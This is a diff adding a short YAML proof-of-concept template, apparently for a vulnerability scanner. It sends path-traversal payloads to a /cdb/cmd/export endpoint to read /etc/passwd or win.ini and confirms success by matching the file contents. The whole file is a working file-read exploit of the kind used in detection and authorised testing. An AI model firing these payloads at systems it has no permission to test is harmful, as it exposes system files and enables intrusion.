@@ -1,0 +1,27 @@
+name: poc-yaml-test
+manual: true
+transport: http
+rules:
+  linux:
+    request:
+      cache: true
+      method: POST
+      headers:
+        Content-Type: application/json
+      path: /cdb/cmd/export
+      body: |-
+        ["extra_file", 1, "../../../../../../../../etc/passwd", ""]
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  windows:
+    request:
+      cache: true
+      method: POST
+      headers:
+        Content-Type: application/json
+      path: /cdb/cmd/export
+      body: |-
+        ["extra_file", 1, "c:\\windows\\win.ini", ""]
+    expression: response.status == 200 && response.body_string.contains("for 16-bit app support")
+expression: linux() || windows()
+detail:
+  author: k3ppf0r
